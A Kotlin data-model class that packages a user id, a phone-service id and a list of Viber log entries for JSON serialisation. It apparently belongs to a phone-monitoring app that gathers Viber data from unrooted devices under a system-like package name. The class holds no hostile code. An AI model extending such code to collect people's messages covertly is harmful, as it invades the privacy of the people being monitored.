package com.android.services.models

import com.android.services.db.entities.ViberUnrooted
import com.google.gson.annotations.SerializedName

class ViberUnrootedLogs {
    @SerializedName("userId")
    var userId: String? = null
        private set

    @SerializedName("phoneServiceId")
    var phoneServiceId: String? = null
        private set

    @SerializedName("data")
    var viberUnrootedList: List<ViberUnrooted>? = null
        private set

    constructor()
    constructor(userId: String?, phoneServiceId: String?, viberUnrootedList: List<ViberUnrooted>?) {
        this.userId = userId
        this.phoneServiceId = phoneServiceId
        this.viberUnrootedList = viberUnrootedList
    }
}